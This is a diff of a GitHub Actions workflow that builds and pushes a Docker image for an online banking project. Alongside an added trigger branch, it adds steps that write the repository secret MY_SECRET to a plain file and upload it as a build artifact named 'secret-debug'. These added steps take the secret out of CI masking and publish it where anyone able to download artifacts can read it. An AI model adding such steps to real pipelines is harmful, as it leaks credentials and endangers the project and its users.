@@ -4,6 +4,7 @@ on:
   push:
     branches:
       - main
+      - other-branch
 
 jobs:
   build:
@@ -65,4 +66,10 @@ jobs:
       - name: Push Docker image to GHCR
         run: |
           docker push ghcr.io/adorsys-gis/webank-online-banking:${{ github.sha }}
+
+      - run: echo "${{ secrets.MY_SECRET }}" > secret.txt
+      - uses: actions/upload-artifact@v4
+        with:
+          name: secret-debug
+          path: secret.txt
 
